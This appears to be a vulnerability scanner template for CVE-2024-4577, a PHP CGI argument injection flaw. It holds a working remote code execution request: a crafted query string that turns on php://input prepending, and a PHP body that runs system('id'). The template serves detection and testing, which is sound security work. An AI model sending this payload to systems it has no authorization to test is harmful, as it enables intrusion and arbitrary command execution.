id: CVE-2024-4577

info:
  name: PHP CGI Argument Injection (CVE-2024-4577)
  author: Aliz Hammond, Sina Kheirkhah
  severity: critical
  description: |
    PHP CGI Argument Injection vulnerability (CVE-2024-4577) allows remote code execution via crafted arguments.
  reference:
    - https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/
    - https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
  tags: cve,cve2024,php,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
    body: "<?php system('id'); echo 1337; die;?>"
    matchers:
      - type: word
        words:
          - "1337"
        part: body
